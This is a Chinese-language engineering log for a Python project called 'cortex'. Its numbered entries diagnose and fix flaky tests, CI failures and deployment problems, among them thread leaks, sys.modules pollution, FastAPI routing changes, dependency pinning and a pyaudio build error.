**根因：** `ScreenMonitorSource._ensure_process` 启动的 reader 后台线程（非 daemon）在测试未显式 stop 时遗留运行；测试用 `__new__` 绕过 `__init__`（实例不在注册表无法清理）+ mock 掉 `_close_process`（`_reader_running` 保持 True 线程永不停）。遗留线程持有 pytest 捕获 fd → 下一个测试 capture 读取阻塞（fd 泄漏 + mock 锁死锁）。

**修复（三层）：**
1. 生产代码：`ScreenMonitorSource`/`ScreenDiffSource` 加类级 `weakref.WeakSet` 活跃实例注册表，`stop()` 注销
2. conftest autouse fixture `_stop_background_sources` 统一 stop 遗留实例
3. 测试修正：`_source` 手动注册 + 不再 mock `_close_process`

**验证：** 之前必卡的组合 5/5 稳定通过；全量正常退出。

**同类排查：** `setup.py`（window_detector）、`PerceptionEventBus`、`voice/hotkey/ocr` 检测器均存在非 daemon 后台线程，全部纳入 weakref 注册表 + conftest 统一清理。

---

## 31. test_detect_text OCR 顺序污染 —— sys.modules 模块级置 None（后端/测试）

**现象：** 全量测试中 `test_screen_monitor_server.py::test_detect_text` 偶发失败，单独运行通过。

**根因：** `test_mcp_screen_monitor.py` 模块级 `sys.modules["rapidocr_onnxruntime"] = None` 永久污染（为防真实 OCR 加载），导致后续 import `screen_monitor_server` 的测试里 `_ocr` 为 None，`extract_text=True` 分支不执行 → 断言无文字。

**修复：** `test_detect_text` 改用 monkeypatch 注入 fake OCR（临时替换 `sms._ocr`），不依赖模块级污染。

**教训：** 模块级 `sys.modules[X] = None` 会污染整个测试进程，应改用 monkeypatch/局部注入。

---

## 32. BytesIO 内部 buffer 不被 pympler 计算 —— 泄漏检测盲区（测试基建）

**现象：** 泄漏检测验证套件中"文件句柄泄漏"测试（`io.BytesIO` 累积）漏报——pympler 只统计 Python 对象，`BytesIO` 的 C 层 buffer 不计入大小。

**根因：** `pympler.muppy.get_size` 对 `_io.BytesIO` 只算对象本身，内部 bytes buffer 无法归因。

**修复：** 泄漏测试同时累积内容字节（`_FILE_CONTENTS` 显式引用 bytes），让 muppy 可测。

**教训：** pympler 字节采样对"纯 C 缓冲"（BytesIO/某些扩展）有盲区；泄漏测试套件（tests/leak/）的价值正是暴露这类检测盲区。

---

## 33. 本地代理 fake-ip 解析 example.com 为内网 IP → SSRF 防护误判（测试环境）

**现象：** 本地（macOS + 代理软件如 Surge/Clash）DNS 把 example.com 解析到 `198.18.0.50`（fake-ip 网段），`_is_private_ip` 判定为内网 → 两个 SSRF 相关测试失败（`test_is_private_ip_public`、`test_web_fetch_bad_method`）。CI（ubuntu 正常解析公网）不受影响。

**修复：** 测试 mock DNS/内网检查：
- `test_is_private_ip_public` mock `socket.getaddrinfo` 返回固定公网 IP
- `test_web_fetch_bad_method` monkeypatch `_is_private_ip` 返回 False

**教训：** 依赖真实 DNS 的测试在代理环境不可靠，应 mock 系统边界。

---

## 34. test_api 版本断言过期（2.0.0 vs 实际版本）（测试）

**现象：** `tests/integration/test_api.py::test_root_returns_app_info` 断言 `version == "2.0.0"`，项目已发布到 v2.1.1 → 断言失败。

**修复：** 改为读 `cortex.version.__version__` 动态比较，不再硬编码。

---

## 35. macOS 不允许 resource.setrlimit(RLIMIT_AS) 低于当前用量（测试基建）

**现象：** 实现"内存上限自动终止"时用 `RLIMIT_AS` 限制进程地址空间，设置 100MB 上限报错 `current limit exceeds maximum limit`（当前进程地址空间已超）。

**根因：** macOS 的 `RLIMIT_AS` 是总地址空间上限，且**不能设置低于当前已用**；Python 进程加载库后地址空间已很大。

**解决：** 放弃 RLIMIT_AS，改用**看门狗线程** + `psutil.Process().memory_info().rss` 周期采样，超限 `os._exit(1)`（conftest `_mem_watchdog`，默认 4096MB，`CORTEX_TEST_MEM_LIMIT_MB` 可调）。

---

## 36. sys.getallocatedobjects() 在 Python 3.13 移除（测试基建）

**现象：** 泄漏检测采样用 `sys.getallocatedobjects()` 报 `AttributeError`（被 try/except 吞掉导致采样点为空）。

**根因：** 该函数在 3.8 引入、3.11 起废弃、3.13 移除。

**修复：** 改用 `len(gc.get_objects())`（对象计数），后进一步升级为 `pympler.muppy.get_size`（真实字节）。

---

## 37. EventStore.__del__ 对假 faiss 索引触发 GC 死循环（后端/测试）

**现象：** `test_event_store_ext.py` 原始写法在 fixture teardown 后触发 Python 3.13 无限 GC 循环（99.7% CPU 卡死）。

**根因：** `EventStore.__del__` 在循环 GC 期对已置 `None`/假索引调用 `faiss.write_index` 抛 SWIG TypeError，GC 反复重试。

**修复：** fixture teardown 先把 `_faiss_index` 置 None 再 `close()`，避免 `__del__` 在 GC 期接触假索引。

---

## 44. CI 全量随机 flaky —— `set_event_loop(None)` 残留污染（测试）

**现象：** CI 全量（`pytest tests`，随机顺序）偶发 `test_screen_router_ext.py::test_merge_vision_sync_no_running_loop` 报 `RuntimeError: There is no current event loop in thread 'MainThread'`；单跑/按目录跑均通过，无法本地稳定复现。

**根因：** `test_model_runner_ext.py::test_reject_session_user_responses` 结束时 `asyncio.set_event_loop(None)` **不还原**先前的 loop。Python 3.13 下 `asyncio.get_event_loop_policy().get_event_loop()` 在无当前 loop 时直接抛 RuntimeError（不再隐式创建）。随机顺序下该污染测试落在 `test_screen_router_ext` 之前即触发。

**修复：**
- 污染源：保存并还原先前的 event loop（`except RuntimeError → old=None` 处理 3.13 无 loop 情形），不再残留 `set_event_loop(None)`
- 受害者：`test_screen_router_ext` 保存旧 loop 同样容错 `RuntimeError → None`

**验证：** 两文件 + 相关 381 项测试通过；污染机理本地直接验证（`set_event_loop(None)` 后 `get_event_loop_policy().get_event_loop()` 必抛）。

**教训：** 任何"切走"全局单例（事件循环、sys.modules、环境变量）的测试**必须还原**，且还原代码要考虑 Python 版本行为差异（3.13 不再隐式创建 loop）。

---

## 45. CI 全量随机 flaky —— `/tools` 路由断言（测试，根因未复现）

**现象：** CI 全量偶发 `test_api_main.py::test_register_module_routers_includes_all` 报 `AssertionError: /tools`（`register_module_routers` 挂载后无 `/tools` 路由）；单跑/HEAD/按目录跑全部通过。

**根因：** 未能在本地复现。`infra.tool_manager.api` 的 `router` 是**静态定义**（`APIRouter(prefix="/tools")` + 大量固定端点），无任何条件注册；已排查 `sys.modules` 重导入、`include_router`/`tool_router` 被替换等污染途径均无果。推断与 §44 同类——随机顺序下的全局状态污染，污染源待复现。

**处理：** 在断言前加**诊断守卫** `assert tool_router.routes`（给出明确信息"router 被重导入或污染"），使复发时能立即定位，而非笼统的 `/tools` 缺失。

**后续：** 若 CI 再次出现，依据诊断信息定位污染源；本地 `tests/unit` 全量 5834 通过可作基线。

---

## 52. CI 测试失败排查：PyQt6 环境缺失 + 测试依赖真实用户配置（测试/环境）

**现象：** CI（ubuntu，Python 3.11）全量失败 3 项：
- `test_frontend_server.py::test_pet_widget_*`（2 项）—— `ModuleNotFoundError: No module named 'PyQt6'`
- `test_api_main.py::test_register_module_routers_includes_all` —— `AssertionError: /tools`（历史 flaky，§45，诊断守卫已加）

**根因 1（PyQt6 环境缺失）：** `frontend/pet_widget.py` 顶层 `from PyQt6.QtCore import ...`，但 `requirements.txt`/`pyproject.toml` **没有 PyQt6**——本地 macOS 装了所以本地过，CI ubuntu 没装 → 测试 import pet_widget 失败。测试只读 `BACKEND_URL`（端口发现），不实例化 Qt。

**修复：** `tests/conftest.py` 新增 session autouse fixture `mock_pyqt6_if_missing`——PyQt6 不可用时向 `sys.modules` 注入 MagicMock 模块树（QtCore/QtGui/QtWebChannel/QtWebEngineCore/QtWebEngineWidgets/QtWidgets），pet_widget 可正常导入；真实环境（本地有 PyQt6）不 mock。验证：无 PyQt6 环境下 pet_widget 导入成功且 BACKEND_URL 正确。

**根因 2（conscience 属性改名未同步 integration 测试）：** 心理活动对话缓存改 `_dialog_buffers`（§49）时只更新了 `tests/unit/test_conscience_ext.py`，`tests/integration/test_conscience.py` 仍引用 `_last_dialog_buffer` → AttributeError。

**修复：** 同步 integration 测试到 `_dialog_buffers`。

**根因 3（reasoning 兜底默认改 False 未同步全部测试）：** `fallback_to_reasoning` 默认改 False（§51）时只更新了 `test_large_model_client_ext.py` / `test_small_model_client_ext.py` / `test_medium_model_client.py`，遗漏 `test_model_client_chat.py::test_generate_reasoning_fallback`。

**修复：** 同步该测试（默认不返回思维链 + 显式 True 兜底）。

**根因 4（prompt_composer 测试依赖真实 personas.yaml）：** 纯对话人设尊重编排 active 后（§47），`test_chat_light_prompt.py` / `test_chat_light_ext.py` 的 composer 测试**没 mock `get_agent_active`** → 依赖用户真实 `~/.cortex/personas.yaml` 的编排状态（orchestrator 激活与否），用户改配置即 flaky——正是 §47 教训"测试吃真实默认值"的复现。

**修复：** 相关测试 mock `Settings.get_agent_active`（确定化），不依赖真实用户配置。

**验证：** 相关 226 项测试通过；`pytest tests/unit` 全量通过（PyQt6 mock / conscience / reasoning / get_agent_active 修复均生效）。

**教训：** ① 测试 import 被测模块时，环境缺桌面/原生依赖（PyQt6 等）必须在 conftest 统一 mock，不能依赖"本地恰好装了"；② 改内部属性/默认值时，要全局搜索所有引用（含 integration 测试）；③ 任何读用户真实配置文件（personas.yaml/settings.json）的测试都必须 mock 读取层，否则用户改配置即 flaky。

---

## 53. 配置指纹重建在测试环境触发真实 client 构造 → `API key 不能为空`（后端/测试）

**现象：** CI 失败 6 项 `ValueError: API key 不能为空`（test_config_hot_reload / test_pet_engine / test_pet_engine_ext），本地通过、CI 必现。

**根因（两层）：**
1. **显式注入的 client 被指纹重建覆盖**：测试设 `pe._client = _real_client()`（api_key="t"），但配置指纹逻辑 `if _client is None or _client_cfg != cfg` 中 `_client_cfg` 为 None（测试没记录）→ `None != cfg` → 重建为**无参** `LargeModelClient()` → 读 settings 的 LARGE_MODEL_API_KEY（CI 无 `.env`/`~/.cortex/settings.json` → 空）→ 抛 `ValueError: API key 不能为空`。本地有用户 key 所以过，CI 无 key 必现。
2. **模块级 from-import 使测试 mock 失效**：`ModelRunner` 模块顶部 `from infra.model.large_model_client import LargeModelClient` 绑定后，`monkeypatch.setattr("infra.model.large_model_client.LargeModelClient", ...)` 只改源模块属性，ModelRunner 里已绑定的引用不变 → 测试 mock 无效 → 真实构造 → 同样报错。

**修复（ModelRunner.client / pet_engine._build_messages）：**
- 重构配置指纹判断为三分支：`_client is None`→懒建；`_client_cfg is None`（显式注入）→**只记录指纹不重建**；`_client_cfg != cfg`→重建
- client 构造改**函数内 import** `from infra.model.large_model_client import LargeModelClient`——每次从源模块取，测试 patch 源模块属性即生效
- 同步更新 `test_model_runner_client_lazy` 的 patch 路径为源模块

**验证：** 相关 287 项测试通过；无 API key 环境下显式注入的 client 不再被覆盖、mock 正常生效。

**教训：** ① "懒建缓存 + 配置指纹重建"必须**尊重显式注入**（`_client_cfg` 缺失≠需要重建，可能只是外部设置的实例）；② 模块级 `from X import Y` 会把 Y 绑定到本命名空间，测试 mock 源模块属性不生效——**需要在函数内 import 或通过模块引用访问**才能被 patch。

---

## 54. CI `/tools` 路由断言失败——fastapi 0.141 惰性 `_IncludedRouter`（测试）

**现象：** CI（ubuntu/Python 3.11）`test_api_main.py::test_register_module_routers_includes_all` 稳定失败 `AssertionError: /tools`，本地（3.13）从不失败。诊断：tool_router routes=17 非空、include_router 是原始方法、app.router 正常，但 `app.routes` 里全是默认路由（/docs 等）+ 一个 `''`，手动 include 也"失败"。

**根因：fastapi 版本行为变化（非污染）：**
- **fastapi 0.141+**（CI 装 `fastapi>=0.104.1` → 最新 0.141）的 `include_router` **不再立即展开 APIRoute**，而是封装成惰性的 `fastapi.routing._IncludedRouter`（自身无 `.path`，实际路由在 `original_router.routes` 里）
- 测试用 `getattr(r, "path", "")` 判断路由 → `_IncludedRouter` 无 `.path` → 返回 `''` → 断言 `/tools` 缺失
- 本地 fastapi 0.135.2 是**展开**行为 → 测试通过。本地 3.11 venv 装 0.141.1 复现，确认是版本差异

**修复（tests/unit/test_api_main.py）：**
- 新增 `_collect_route_paths(routes)`：递归展开 `_IncludedRouter.original_router.routes` 收集真实 path，兼容 fastapi 0.135（展开）与 0.141+（惰性封装）
- `test_register_module_routers_includes_all` / `test_register_module_routers_skips_difference_when_disabled` 改用该 helper

**验证：** 3.11 venv（fastapi 0.141.1，CI 同版本）下 `/tools` 测试通过；本地 3.13 120 项通过。

**教训：** Web 框架版本升级可能改变"看似稳定"的行为（include_router 展开→惰性封装）。测试对 `app.routes` 的路径断言要用**递归收集**（兼容 `_IncludedRouter`/`Mount` 等包装），不能假设路由对象都有 `.path`；且本地与 CI 的 fastapi 版本差异会掩盖这类问题——**应在与 CI 相同的 Python/依赖版本下验证**。

---

## 55. 依赖版本漂移——CI 装最新、本地停旧版（`>=` 不锁版本）

**背景：** §54 的 `/tools` 失败根因是 fastapi 0.141 行为变化（惰性 `_IncludedRouter`），而本地 0.135.2 是旧行为。为什么 CI/本地版本不一致？

**根因：** `requirements.txt` 用 `fastapi>=0.104.1`（只有下限、不锁上限）：
- **CI**：每次全新环境 `pip install -r`，装当前最新（0.141.1）
- **本地**：环境里已有的 0.135.2 满足 `>=0.104.1`，pip 不升级 → 停在旧版
- 结果：CI 与本地依赖版本漂移 → Web 框架行为变化在 CI 暴露、本地永远测不出来

**修复（锁定版本）：**
- `requirements.txt`：`fastapi>=0.104.1` → `fastapi==0.141.1`（锁到已验证版本，含注释说明原因）
- 测试已兼容 0.135（展开）/ 0.141（惰性封装）两种 include_router 行为（§54），即使未来锁定被放宽也不会脆断

**验证：** 本地/CI 统一 fastapi 0.141.1 后行为一致；§54 测试在 0.141.1 下通过。

**教训：** `>=` 版本约束在"每次全新安装"的场景（CI/部署/新机器）天然漂移——**CI 装到最新、旧环境停在旧版**，任何框架行为变化都会变成"CI 红、本地绿"。核心 Web/运行时依赖应**锁定 `==`**（或引入 lock 文件），CI 与本地用同一版本验证。

---

## 58. CI 全量下 socket/子进程测试 20s 超时误杀（测试/CI）

**现象：** CI 全量（5875 测试 / 10 分钟）偶发 `test_screen_capture_daemon.py::test_bind_stale_retry` `Timeout (>20.0s)` + 下一个测试 `previous item was not torn down properly`（连锁）；此前 `test_runtime_expert_ext` 也有同类 Timeout。本地单独/小范围跑全部通过（test_bind_stale_retry call 仅 0.01s）。

**根因：** `pytest.ini` 的 `--timeout=20` 对**全量负载**下的调度/导入延迟过紧——单测本身毫秒级，但 CI 机器跑 10 分钟 5875 测试时资源紧张，pytest 从测试开始到结束（含 setup/导入/调度）可能超过 20s → 被 pytest-timeout 误杀；被杀后 monkeypatch teardown 未跑 → 下一个测试报 "not torn down properly"。

**修复：**
- `pytest.ini`：`--timeout=20` → `--timeout=60`（给全量负载留余量；项目单测本地最长 ~21s，60s 不会掩盖真死锁太久）
- `test_bind_stale_retry` / `test_run_exits_when_bind_none`：socket 路径从全局 `/tmp/x.sock` 改为 `tmp_path` 隔离（防全量下真实 socket 文件残留冲突）

**验证：** screen_capture_daemon + runtime_expert 67 项通过。

**教训：** `pytest-timeout` 阈值要按**最坏情况（CI 全量负载）**设，不能按本地单测耗时——毫秒级测试在全量下也会因调度/导入延迟超时。这类"单测快、全量误杀"优先放宽超时，而非改测试逻辑。

---

## 66. 测试直接篡改全局单例 ToolRegistry._tools —— 全量 CI 69 个失败（测试污染）

**现象：** CI 全量跑出 69 个失败：`toolgate`/`tool_visibility`/`tools_search`/`tool_registry_ext` 报 `'_T' object has no attribute 'risk_level/category/enabled/...'`，本地单文件测试却全部通过。

**根因：** 我新增的 `test_tool_permission_ext.py::test_get_base_whitelist_star` 为了测 `*` 展开逻辑，直接执行 `tr.ToolRegistry._tools = {含缺字段的 _T 对象}` **篡改了全局共享单例**。全量运行时，`test_toolgate` 等读取 `ToolRegistry._tools` 读到残留的 `_T` 对象（缺 risk_level/category 等字段）→ AttributeError。单文件测试通过是因为 `_T` 污染只在**跨文件执行顺序**下被其他测试读取才暴露。

**修复：**
1. 用 `monkeypatch.setattr(ToolRegistry, "_tools", {...})` 隔离——pytest monkeypatch 在 **teardown 自动恢复**，不污染全局，且不依赖真实注册工具。
2. （关联）`read_context` 工具误加入所有 tier 基础工具，导致 `test_get_control_tools_expert` 失败 → 移回 large/supervisor 委托组。

**验证：** CI 同规模全量 `tests/unit` 6036 passed（原 69 failed → 0）。

**教训：** ① 测试**绝不要直接对全局共享单例的内部状态赋值**（`ToolRegistry._tools`、`_runner_managers`、`_session_memory_context` 等）——要隔离就用 `monkeypatch.setattr`（自动恢复）或真实 API + cleanup；② 单文件全过 ≠ 测试安全，这类"全量跨文件顺序才暴露"的污染必须全量回归；③ mock 对象缺字段（`_T`）是"读到被篡改的全局状态"的典型信号。

---

## 81. Vercel 部署失败：pyaudio 编译需要 portaudio.h（服务器/无头环境依赖治理）

**现象：** 部署到 Vercel 时构建失败：
```
error: Command '['cc', ..., '-c', 'src/pyaudio/device_api.c', ...]' returned non-zero exit status 1
hint: This error likely indicates that you need to install a library that provides "portaudio.h"
help: `pyaudio` (v0.2.14) was included because `cortex-agent` depends on `pyaudio`
```

**根因：** `requirements.txt` 把 `pyaudio` 列为必需依赖。PyAudio 是 PortAudio 的 C 扩展，pip 安装需编译（源码无 wheel），编译依赖系统开发头文件 `portaudio.h`。Vercel Python 沙箱没有该库，且无 apt 可装。pyaudio 仅用于本地麦克风录音（`modules/perception/detectors/voice_detector.py` / `hotkey_voice_detector.py`），服务器/无头环境既无法编译也无用途。

**修复：** 将本地硬件/桌面专用依赖从主 `requirements.txt` 移出，新建 `requirements-voice.txt`：
- 移除：`pyaudio`、`pynput`（全局热键）、`pyautogui`（桌面自动化）、`pyserial`（串口）
- 保留：`SpeechRecognition`、`gTTS`、`openai-whisper`（纯 Python / 服务器可装）
- 语音检测器已做延迟导入 + `_check_availability()` 的 `except ImportError` 降级（`is_available()=False` 不启动），无顶层 `import pyaudio`，缺失时不影响核心功能。

**验证：** `test_detectors.py`/`test_voice_hotkey.py`/`test_perception.py` 107 测试通过；requirements.txt 语法合法；语音/桌面模块均函数内延迟 import。

**教训：** 服务端部署（Vercel 等沙箱构建）不能包含依赖系统 C 库/无 wheel 的本地硬件包。此类依赖应独立成可选文件（如 requirements-voice.txt），并在代码层做延迟导入 + ImportError 优雅降级，让"装了有功能、没装不崩溃"。
